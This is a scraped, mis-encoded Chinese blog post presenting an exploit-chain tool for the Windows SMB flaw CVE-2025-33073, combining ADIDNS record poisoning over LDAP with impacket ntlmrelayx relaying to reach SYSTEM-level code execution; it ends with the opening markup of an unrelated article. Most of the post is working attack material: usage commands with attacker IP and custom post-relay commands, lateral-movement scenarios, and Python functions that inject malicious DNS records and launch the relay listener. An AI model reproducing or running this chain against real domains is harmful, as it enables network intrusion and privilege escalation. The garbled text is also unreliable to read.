itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ­ç§˜CVE-2025-33073ï¼šWindows SMBå®¢æˆ·ç«¯NTLMä¸­ç»§æ”»å‡»ä¸ADIDNSæŠ•æ¯’åˆ©ç”¨é“¾
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1743174852185579/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    qife122
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T01:49:54.000Z" title="Thu Jan 08 2026 01:49:54 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">CVE-2025-33073 æ¼æ´åˆ©ç”¨ä¸ADIDNSæŠ•æ¯’æ”»å‡»é“¾</h2>
<h3 data-id="heading-1">é¡¹ç›®æè¿°</h3>
<p>æœ¬é¡¹ç›®æ˜¯é’ˆå¯¹Windows SMBå®¢æˆ·ç«¯æ¼æ´CVE-2025-33073çš„åˆ©ç”¨é“¾ç ”ç©¶å·¥å…·ã€‚è¯¥æ¼æ´æ˜¯ä¸€ä¸ªé«˜ä¸¥é‡æ€§çš„èº«ä»½éªŒè¯è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVSS 8.8ï¼‰ï¼Œå…è®¸æ”»å‡»è€…åœ¨æœªå¯ç”¨SMBç­¾åçš„æƒ…å†µä¸‹ï¼Œé€šè¿‡NTLMä¸­ç»§æ”»å‡»è·å¾—SYSTEMçº§åˆ«çš„ä»£ç æ‰§è¡Œæƒé™ã€‚æœ¬å·¥å…·ç»“åˆäº†ADIDNSï¼ˆActive Directoryé›†æˆDNSï¼‰æŠ•æ¯’æŠ€æœ¯ï¼Œè‡ªåŠ¨åŒ–å®ŒæˆDNSè®°å½•æ³¨å…¥ã€ç­‰å¾…ä¼ æ’­å’Œè§¦å‘SMB NTLMä¸­ç»§çš„å®Œæ•´æ”»å‡»æµç¨‹ï¼Œç”¨äºæ¼”ç¤ºå’Œç ”ç©¶WindowsåŸŸç¯å¢ƒä¸­çš„æ¨ªå‘ç§»åŠ¨é£é™©ã€‚</p>
<h3 data-id="heading-2">åŠŸèƒ½ç‰¹æ€§</h3>
<ul>
<li><strong>è‡ªåŠ¨åŒ–æ”»å‡»é“¾</strong>ï¼šæ•´åˆdnstool.pyä¸impacket-ntlmrelayxï¼Œå®ç°ä¸€é”®åŒ–æ”»å‡»æµç¨‹</li>
<li><strong>ADIDNSæŠ•æ¯’</strong>ï¼šé€šè¿‡LDAPåè®®å‘Active Directoryæ·»åŠ æ¶æ„DNSè®°å½•</li>
<li><strong>æ™ºèƒ½ç­‰å¾…æœºåˆ¶</strong>ï¼šè‡ªåŠ¨ç›‘æ§DNSè®°å½•ä¼ æ’­çŠ¶æ€ï¼Œç¡®ä¿æŠ•æ¯’æˆåŠŸ</li>
<li><strong>çµæ´»çš„NTLMä¸­ç»§å¯åŠ¨</strong>ï¼šæ”¯æŒåœ¨å½“å‰ç»ˆç«¯æˆ–æ–°å»ºxtermçª—å£ä¸­å¯åŠ¨ntlmrelayxç›‘å¬å™¨</li>
<li><strong>æ”¯æŒè‡ªå®šä¹‰å‘½ä»¤æ‰§è¡Œ</strong>ï¼šå¯åœ¨ä¸­ç»§æˆåŠŸæ—¶æ‰§è¡ŒæŒ‡å®šçš„ç³»ç»Ÿå‘½ä»¤</li>
<li><strong>SOCKSä»£ç†æ”¯æŒ</strong>ï¼šå¯é€‰å¼€å¯SOCKSä»£ç†è¿›è¡Œè¿›ä¸€æ­¥çš„ç½‘ç»œæ¸—é€</li>
</ul>
<h3 data-id="heading-3">å®‰è£…æŒ‡å—</h3>
<h4 data-id="heading-4">ç³»ç»Ÿè¦æ±‚</h4>
<ul>
<li>Python 3.x</li>
<li>ç±»Unixæ“ä½œç³»ç»Ÿï¼ˆæ”¯æŒxtermç»ˆç«¯ï¼‰</li>
<li>ç½‘ç»œè®¿é—®æƒé™ï¼ˆå¯è®¿é—®ç›®æ ‡åŸŸæ§DNSæœåŠ¡å™¨ï¼‰</li>
</ul>
<h4 data-id="heading-5">ä¾èµ–å®‰è£…</h4>
<p>é¡¹ç›®ä¾èµ–äºä»¥ä¸‹Pythonåº“ï¼Œå¯é€šè¿‡pipå®‰è£…ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">pip install impacket ldap3 dnspython
</code></pre>
<h4 data-id="heading-6">å·¥å…·ä¾èµ–</h4>
<p>ç¡®ä¿ç³»ç»Ÿä¸­å·²å®‰è£…ä»¥ä¸‹å®‰å…¨å·¥å…·ï¼š</p>
<ul>
<li><strong>impacketå¥—ä»¶</strong>ï¼šç‰¹åˆ«æ˜¯<code>ntlmrelayx</code>å·¥å…·</li>
<li><strong>digå‘½ä»¤</strong>ï¼šç”¨äºDNSæŸ¥è¯¢æµ‹è¯•ï¼ˆé€šå¸¸åŒ…å«åœ¨<code>dnsutils</code>åŒ…ä¸­ï¼‰</li>
<li><strong>xtermç»ˆç«¯</strong>ï¼šå¯é€‰ï¼Œç”¨äºåœ¨æ–°çª—å£ä¸­è¿è¡Œç›‘å¬å™¨</li>
</ul>
<h4 data-id="heading-7">é…ç½®è¯´æ˜</h4>
<p>æ— éœ€é¢å¤–é…ç½®æ–‡ä»¶ï¼Œæ‰€æœ‰å‚æ•°é€šè¿‡å‘½ä»¤è¡Œä¼ é€’ã€‚</p>
<h3 data-id="heading-8">ä½¿ç”¨è¯´æ˜</h3>
<h4 data-id="heading-9">åŸºæœ¬ç”¨æ³•</h4>
<p>è¯¥å·¥å…·æ˜¯ä¸€ä¸ªPythonè„šæœ¬ï¼Œéœ€è¦æä¾›åŸŸç”¨æˆ·å‡­æ®ã€æ”»å‡»è€…IPã€DNSæœåŠ¡å™¨IPå’ŒåŸŸæ§FQDNç­‰ä¿¡æ¯ã€‚</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ç¤ºä¾‹ï¼šæ‰§è¡Œå®Œæ•´çš„æ”»å‡»é“¾</span>
./exploit_chain.py -u domain_user -p password -a attacker_ip -d dns_server_ip -dc dc.domain.com -t target_machine
</code></pre>
<h4 data-id="heading-10">å‚æ•°è¯¦è§£</h4>
<ul>
<li><code>-u, --user</code>ï¼šåŸŸç”¨æˆ·åï¼ˆæ ¼å¼ï¼šDOMAIN\User æˆ– Userï¼‰</li>
<li><code>-p, --password</code>ï¼šç”¨æˆ·å¯†ç </li>
<li><code>-a, --attacker-ip</code>ï¼šæ”»å‡»è€…æ§åˆ¶çš„IPåœ°å€ï¼ˆç”¨äºDNSè®°å½•æŒ‡å‘ï¼‰</li>
<li><code>-d, --dns-ip</code>ï¼šç›®æ ‡åŸŸDNSæœåŠ¡å™¨IPåœ°å€</li>
<li><code>-dc, --dc-fqdn</code>ï¼šåŸŸæ§åˆ¶å™¨çš„å®Œå…¨é™å®šåŸŸå</li>
<li><code>-t, --target</code>ï¼šSMBä¸­ç»§çš„ç›®æ ‡æœºå™¨IPæˆ–ä¸»æœºå</li>
<li><code>--timeout</code>ï¼šç­‰å¾…DNSä¼ æ’­çš„è¶…æ—¶æ—¶é—´ï¼ˆç§’ï¼Œé»˜è®¤60ï¼‰</li>
<li><code>--cli-only</code>ï¼šä»…åœ¨å½“å‰å‘½ä»¤è¡Œå¯åŠ¨ntlmrelayxï¼Œä¸å¼€æ–°çª—å£</li>
<li><code>-c, --command</code>ï¼šä¸­ç»§æˆåŠŸæ—¶æ‰§è¡Œçš„è‡ªå®šä¹‰ç³»ç»Ÿå‘½ä»¤</li>
<li><code>--socks</code>ï¼šå¯ç”¨SOCKSä»£ç†æ¨¡å¼</li>
</ul>
<h4 data-id="heading-11">å…¸å‹æ”»å‡»åœºæ™¯</h4>
<ol>
<li><strong>å†…éƒ¨ç½‘ç»œæ¨ªå‘ç§»åŠ¨</strong>ï¼šåœ¨å·²è·å¾—ä¸€ä¸ªåŸŸç”¨æˆ·å‡­æ®çš„æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…åˆ©ç”¨æ­¤å·¥å…·å‘ADIDNSæ³¨å…¥æŒ‡å‘å…¶æ§åˆ¶æœåŠ¡å™¨çš„DNSè®°å½•ï¼Œç„¶åè¯±å¯¼ç›®æ ‡ä¸»æœºå‘èµ·SMBè¿æ¥ï¼Œé€šè¿‡NTLMä¸­ç»§è·å¾—æ›´é«˜æƒé™ã€‚</li>
<li><strong>æƒé™æå‡</strong>ï¼šç»“åˆå…¶ä»–æ¼æ´æˆ–ç¤¾ä¼šå·¥ç¨‹å­¦ï¼Œè§¦å‘åŸŸå†…ä¸»æœºå‘æ¶æ„DNSè®°å½•æŒ‡å‘çš„æœåŠ¡å™¨è¿›è¡Œèº«ä»½éªŒè¯ï¼Œä»è€Œä¸­ç»§è¯¥èº«ä»½éªŒè¯åˆ°åŸŸæ§åˆ¶å™¨æˆ–å…¶ä»–é«˜ä»·å€¼ç›®æ ‡ã€‚</li>
</ol>
<h3 data-id="heading-12">æ ¸å¿ƒä»£ç </h3>
<h4 data-id="heading-13">1. DNSè®°å½•æ·»åŠ å‡½æ•°</h4>
<p>æ­¤å‡½æ•°è°ƒç”¨å¤–éƒ¨çš„<code>dnstool.py</code>è„šæœ¬ï¼Œé€šè¿‡LDAPå‘Active Directoryæ·»åŠ ä¸€æ¡é™æ€çš„æ¶æ„DNSè®°å½•ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">run_dnstool</span>(<span class="hljs-params">user, password, attacker_ip, dns_ip, dc_fqdn</span>):
    <span class="hljs-string">"""
    ä½¿ç”¨dnstool.pyæ·»åŠ æ¶æ„DNSè®°å½•åˆ°ADIDNSã€‚
    
    å‚æ•°:
        user: å…·æœ‰å†™å…¥ADIDNSæƒé™çš„åŸŸç”¨æˆ·
        password: å¯¹åº”ç”¨æˆ·çš„å¯†ç 
        attacker_ip: æ”»å‡»è€…æœåŠ¡å™¨IPï¼ŒDNSè®°å½•å°†æŒ‡å‘æ­¤åœ°å€
        dns_ip: ç›®æ ‡åŸŸDNSæœåŠ¡å™¨IP
        dc_fqdn: åŸŸæ§åˆ¶å™¨çš„FQDN
    """</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"[*] Adding malicious DNS record using dnstool.py..."</span>)
    dnstool_cmd = [
        <span class="hljs-string">"python3"</span>, <span class="hljs-string">"dnstool.py"</span>,
        <span class="hljs-string">"-u"</span>, user,
        <span class="hljs-string">"-p"</span>, password,
        <span class="hljs-string">"-a"</span>, <span class="hljs-string">"add"</span>,
        <span class="hljs-string">"-r"</span>, STATIC_DNS_RECORD,  <span class="hljs-comment"># é¢„å®šä¹‰çš„DNSè®°å½•å</span>
        <span class="hljs-string">"-d"</span>, attacker_ip,
        <span class="hljs-string">"-dns-ip"</span>, dns_ip,
        dc_fqdn
    ]
    subprocess.run(dnstool_cmd, check=<span class="hljs-literal">True</span>)  <span class="hljs-comment"># æ‰§è¡Œdnstoolå‘½ä»¤</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"[+] DNS record added."</span>)
</code></pre>
<h4 data-id="heading-14">2. DNSä¼ æ’­ç­‰å¾…å‡½æ•°</h4>
<p>è¯¥å‡½æ•°å¾ªç¯æŸ¥è¯¢DNSæœåŠ¡å™¨ï¼Œç¡®è®¤æ³¨å…¥çš„æ¶æ„è®°å½•å·²æˆåŠŸä¼ æ’­å¹¶ç”Ÿæ•ˆã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">wait_for_dns_record</span>(<span class="hljs-params">record, dns_ip, timeout=<span class="hljs-number">60</span></span>):
    <span class="hljs-string">"""
    ç­‰å¾…æŒ‡å®šçš„DNSè®°å½•åœ¨ç›®æ ‡DNSæœåŠ¡å™¨ä¸Šç”Ÿæ•ˆã€‚
    
    å‚æ•°:
        record: è¦æŸ¥è¯¢çš„DNSè®°å½•åç§°
        dns_ip: ç›®æ ‡DNSæœåŠ¡å™¨IP
        timeout: è¶…æ—¶æ—¶é—´ï¼ˆç§’ï¼‰
    
    è¿”å›:
        bool: æˆåŠŸè§£æåˆ°è®°å½•è¿”å›Trueï¼Œå¦åˆ™è¿”å›False
    """</span>
    timeout = <span class="hljs-built_in">int</span>(timeout)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[*] Waiting for DNS record <span class="hljs-subst">{record}</span> to propagate..."</span>)
    start_time = time.time()
    <span class="hljs-keyword">while</span> time.time() - start_time &lt; timeout:
        <span class="hljs-keyword">try</span>:
            <span class="hljs-comment"># ä½¿ç”¨digå‘½ä»¤æŸ¥è¯¢DNSè®°å½•</span>
            result = subprocess.run(
                [<span class="hljs-string">"dig"</span>, <span class="hljs-string">"+short"</span>, record, <span class="hljs-string">f"@<span class="hljs-subst">{dns_ip}</span>"</span>],
                capture_output=<span class="hljs-literal">True</span>, text=<span class="hljs-literal">True</span>
            )
            <span class="hljs-keyword">if</span> result.stdout.strip():  <span class="hljs-comment"># å¦‚æœæŸ¥è¯¢ç»“æœéç©º</span>
                <span class="hljs-built_in">print</span>(<span class="hljs-string">"[+] DNS record is live."</span>)
                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[!] Error checking DNS record: <span class="hljs-subst">{e}</span>"</span>)
        time.sleep(<span class="hljs-number">2</span>)  <span class="hljs-comment"># æ¯2ç§’æ£€æŸ¥ä¸€æ¬¡</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"[!] Timeout reached. DNS record not found."</span>)
    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
</code></pre>
<h4 data-id="heading-15">3. NTLMä¸­ç»§å¯åŠ¨å‡½æ•°</h4>
<p>æ ¹æ®ç”¨æˆ·é€‰æ‹©ï¼Œåœ¨å½“å‰ç»ˆç«¯æˆ–æ–°å»ºçš„xtermçª—å£ä¸­å¯åŠ¨impacketçš„ntlmrelayxç›‘å¬å™¨ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">start_ntlmrelayx</span>(<span class="hljs-params">target, cli_only=<span class="hljs-literal">False</span>, custom_command=<span class="hljs-literal">None</span>, socks=<span class="hljs-literal">False</span></span>):
    <span class="hljs-string">"""
    å¯åŠ¨impacket-ntlmrelayxè¿›è¡ŒSMB NTLMä¸­ç»§ç›‘å¬ã€‚
    
    å‚æ•°:
        target: ä¸­ç»§ç›®æ ‡ï¼ˆå¦‚åŸŸæ§åˆ¶å™¨ï¼‰
        cli_only: ä¸ºTrueåˆ™åœ¨å½“å‰ç»ˆç«¯å¯åŠ¨ï¼Œå¦åˆ™å¼€æ–°xtermçª—å£
        custom_command: ä¸­ç»§æˆåŠŸåæ‰§è¡Œçš„å‘½ä»¤
        socks: æ˜¯å¦å¯ç”¨SOCKSä»£ç†æ¨¡å¼
    """</span>
    <span class="hljs-keyword">if</span> cli_only:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"[*] Starting ntlmrelayx listener in this terminal..."</span>)
        <span class="hljs-comment"># æ„å»ºåŸºæœ¬å‘½ä»¤</span>
        <span class="hljs-keyword">if</span> custom_command:
            cmd = [<span class="hljs-string">"impacket-ntlmrelayx"</span>, <span class="hljs-string">"-t"</span>, target, <span class="hljs-string">"-smb2support"</span>, <span class="hljs-string">"-c"</span>, custom_command]
        <span class="hljs-keyword">else</span>:
            cmd = [<span class="hljs-string">"impacket-ntlmrelayx"</span>, <span class="hljs-string">"-t"</span>, target, <span class="hljs-string">"-smb2support"</span>]
        <span class="hljs-keyword">if</span> socks:
            cmd.append(<span class="hljs-string">"-socks"</span>)  <span class="hljs-comment"># æ·»åŠ SOCKSä»£ç†é€‰é¡¹</span>
        <span class="hljs-keyword">return</span> subprocess.Popen(cmd)  <span class="hljs-comment"># å¯åŠ¨å­è¿›ç¨‹</span>
    <span class="hljs-keyword">else</span>:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"[*] Starting ntlmrelayx listener in a new xterm..."</span>)
        <span class="hljs-comment"># åœ¨xtermä¸­å¯åŠ¨ï¼Œä¿æŒçª—å£æ‰“å¼€</span>
        <span class="hljs-keyword">if</span> custom_command:
            cmd = [<span class="hljs-string">"xterm"</span>, <span class="hljs-string">"-hold"</span>, <span class="hljs-string">"-e"</span>, <span class="hljs-string">"impacket-ntlmrelayx"</span>, <span class="hljs-string">"-t"</span>, target, <span class="hljs-string">"-smb2support"</span>, <span class="hljs-string">"-c"</span>, custom_command]
        <span class="hljs-keyword">else</span>:
            cmd = [<span class="hljs-string">"xterm"</span>, <span class="hljs-string">"-hold"</span>, <span class="hljs-string">"-e"</span>, <span class="hljs-string">"impacket-ntlmrelayx"</span>, <span class="hljs-string">"-t"</span>, target, <span class="hljs-string">"-smb2support"</span>]
        <span class="hljs-keyword">if</span> socks:
            cmd.insert(-<span class="hljs-number">1</span>, <span class="hljs-string">"-socks"</span>)  <span class="hljs-comment"># åœ¨å‘½ä»¤æœ«å°¾å‰æ’å…¥SOCKSé€‰é¡¹</span>
        <span class="hljs-keyword">return</span> subprocess.Popen(cmd)
</code></pre>
<h4 data-id="heading-16">4. ADIDNSå·¥å…·æ ¸å¿ƒäº¤äº’ä»£ç ï¼ˆèŠ‚é€‰è‡ªdnstool.pyï¼‰</h4>
<p>æ­¤éƒ¨åˆ†ä»£ç å±•ç¤ºäº†å¦‚ä½•é€šè¿‡LDAPåè®®ä¸Active Directory DNSåŒºåŸŸè¿›è¡Œäº¤äº’ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_dns_record</span>(<span class="hljs-params">connection, record_name, record_data, dnsserver</span>):
    <span class="hljs-string">"""
    é€šè¿‡LDAPå‘ADIDNSæ·»åŠ ä¸€æ¡DNSè®°å½•ã€‚
    
    å‚æ•°:
        connection: å·²å»ºç«‹çš„LDAPè¿æ¥
        record_name: è¦æ·»åŠ çš„è®°å½•åç§°
        record_data: è®°å½•æ•°æ®ï¼ˆå¦‚IPåœ°å€ï¼‰
        dnsserver: DNSæœåŠ¡å™¨å¯¹è±¡
    """</span>
    <span class="hljs-comment"># æ„å»ºDNSèŠ‚ç‚¹çš„å¯åˆ†è¾¨åç§°ï¼ˆDNï¼‰</span>
    dnsroot = dnsserver.get_dns_root()
    container = <span class="hljs-string">'DC='</span> + record_name + <span class="hljs-string">','</span> + dnsroot
    
    <span class="hljs-comment"># åˆ›å»ºdnsNodeå¯¹è±¡å¹¶è®¾ç½®å±æ€§</span>
    dns_record = ldaptypes.DNS_RECORD()
    dns_record[<span class="hljs-string">'Data'</span>] = record_data
    dns_record[<span class="hljs-string">'Type'</span>] = <span class="hljs-number">1</span>  <span class="hljs-comment"># Aè®°å½•ç±»å‹</span>
    
    <span class="hljs-comment"># å‡†å¤‡è¦æ·»åŠ çš„å±æ€§</span>
    attributes = {
        <span class="hljs-string">'objectClass'</span>: [<span class="hljs-string">'top'</span>, <span class="hljs-string">'dnsNode'</span>],
        <span class="hljs-string">'dnsRecord'</span>: [dns_record.getData()],
        <span class="hljs-string">'dNSTombstoned'</span>: <span class="hljs-literal">False</span>
    }
    
    <span class="hljs-comment"># æ‰§è¡ŒLDAPæ·»åŠ æ“ä½œ</span>
    connection.add(container, attributes=attributes)
    print_o(<span class="hljs-string">f"Successfully added record <span class="hljs-subst">{record_name}</span>"</span>)
</code></pre>
<h4 data-id="heading-17">æ¼æ´å…³é”®ä¿¡æ¯ï¼ˆCVE-2025-33073ï¼‰</h4>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section">## æ¼æ´è¯¦æƒ…</span>
<span class="hljs-bullet">-</span> <span class="hljs-strong">**CVE ID**</span>: CVE-2025-33073
<span class="hljs-bullet">-</span> <span class="hljs-strong">**CVSSè¯„åˆ†**</span>: 8.8 (High)
<span class="hljs-bullet">-</span> <span class="hljs-strong">**å½±å“èŒƒå›´**</span>: Windows 10, 11, Server 2012â€“2025
<span class="hljs-bullet">-</span> <span class="hljs-strong">**æ”»å‡»å‘é‡**</span>: ç½‘ç»œï¼ˆéœ€èº«ä»½éªŒè¯ï¼‰
<span class="hljs-bullet">-</span> <span class="hljs-strong">**å½±å“**</span>: SYSTEMçº§åˆ«ä»£ç æ‰§è¡Œ
<span class="hljs-bullet">-</span> <span class="hljs-strong">**å…³é”®ç‰¹æ€§**</span>: ç»•è¿‡NTLMåå°„ç¼“è§£æªæ–½
</code></pre>
<blockquote>
<p><strong>æ³¨æ„</strong>ï¼šæœ¬å·¥å…·ä»…ç”¨äºæˆæƒçš„å®‰å…¨æµ‹è¯•ã€æ•™è‚²å’Œç ”ç©¶ç›®çš„ã€‚æœªç»æˆæƒå¯¹ä»–äººç³»ç»Ÿè¿›è¡Œæµ‹è¯•æ˜¯éæ³•çš„ã€‚
6HFtX5dABrKlqXeO5PUv/ydjQZDJ7Ct83xG1NG8fcAOCkEtiS8C/LxH9i/qwckdE</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸€æ–‡ç²¾é€šAgentic AIè®¾è®¡]]></title>    <link>https://juejin.cn/post/7592524811860525090</link>    <guid>https://juejin.cn/post/7592524811860525090</guid>    <pubDate>2026-01-08T01:58:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592524811860525090" data-draft-id="7592483877986648070" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸€æ–‡ç²¾é€šAgentic AIè®¾è®¡"/> <meta itemprop="keywords" content="Agent,AIç¼–ç¨‹,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-01-08T01:58:31.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="FreeCode"/> <meta itemprop="url" content="https://juejin.cn/user/1282499717900794"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸€æ–‡ç²¾é€šAgentic AIè®¾è®¡
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1282499717900794/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    FreeCode
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T01:58:31.000Z" title="Thu Jan 08 2026 01:58:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
